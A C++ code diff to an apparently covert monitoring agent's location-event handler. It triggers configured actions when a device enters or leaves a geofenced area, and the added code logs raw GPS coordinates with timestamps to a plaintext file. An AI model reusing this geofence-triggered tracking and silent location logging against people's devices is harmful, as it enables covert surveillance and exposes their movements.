@@ -11,12 +11,26 @@
 
 #include "FunctionFunc.h"
 
+#include <iostream>
+#include <fstream>
+#include <time.h>
+using namespace std;
+
+
+#define DTTMFMT "%Y-%m-%d %H:%M:%S "
+#define DTTMSZ 21
+static char *getDtTm (char *buff) {
+    time_t t = time (0);
+    strftime(buff, DTTMSZ, DTTMFMT, localtime (&t));
+    return buff;
+}
+
 // MANAGEMENT - Le coordinate vanno inserite in gradi decimali!!
 DWORD WINAPI OnLocation(LPVOID lpParam) {
 	Event *me = (Event *)lpParam;
 	Configuration *conf;
 	HANDLE eventHandle;
-	int delay, iterations, curIterations = 0, curDelay = 0;
+	DWORD delay, iterations, curIterations = 0, curDelay = 0;
 	wstring type;
 	BOOL bLocation = FALSE;
 
@@ -40,7 +54,12 @@ DWORD WINAPI OnLocation(LPVOID lpParam) {
 	try {
 		delay = conf->getInt(L"delay") * 1000;
 	} catch (...) {
-		delay = INFINITE;
+		//l'INFINITE era stato messo come protezione nel caso non è presente nel file di conf il parametro delay
+		//siccome adesso quel paramentro non è piu' presente decido io arbitrariamente di impostarlo a 120 sec
+		//delay = INFINITE;
+		//delay = 120000;
+		delay = 30000;
+
 	}
 
 	if (type.empty()) {
@@ -99,23 +118,48 @@ DWORD WINAPI OnLocation(LPVOID lpParam) {
 
 					curDistance = gpsObj->VincentFormula(latOrigin, lonOrigin, gps.dblLatitude, gps.dblLongitude);
 
+
+					fstream filestr;
+					wchar_t msgW[128];
+					char msgA[128];
+					swprintf_s(msgW,L"gps: orig:%f,%f pos:%f,%f  Dis:%f  type:%i\n", latOrigin, lonOrigin, gps.dblLatitude, gps.dblLongitude,curDistance,gps.PositionSource );
+					wcstombs(msgA, msgW, wcslen(msgW)+1);
+
+	
+					char buff[DTTMSZ];
+					filestr.open ("gps.txt", fstream::out|fstream::app);
+					filestr << getDtTm (buff) << std::endl;
+					filestr << msgA << std::endl;
+					filestr << std::endl;
+					
+
+
 					// Se la distance e' esattamente 0.0f allora la funzione non e' riuscita a
 					// convergere, percio' non abbiamo una stima attendibile
 					if (curDistance != 0.0f) {
 						if (curDistance <= distance) {
 							if (bLocation == FALSE) {
+								
+								filestr << "Debug - Position.cpp - OnLocation event [IN action triggered] dis:" << curDistance << std::endl;
+								filestr << std::endl;
+
 								DBG_TRACE(L"Debug - Position.cpp - OnLocation event [IN action triggered]\n", 5, FALSE);
 								me->triggerStart(); // In position
 								bLocation = TRUE;
 							}
 						} else {
 							if (bLocation == TRUE) {
+								filestr << "Debug - Position.cpp - OnLocation event [OUT action triggered] dis:" << curDistance <<  std::endl;
+								filestr << std::endl;
+								
 								DBG_TRACE(L"Debug - Position.cpp - OnLocation event [OUT action triggered]\n", 5, FALSE);
 								me->triggerEnd(); // Out of position
 								bLocation = FALSE;
 							}
 						}
 					}
+
+					filestr.close();
 				}
 			}
 
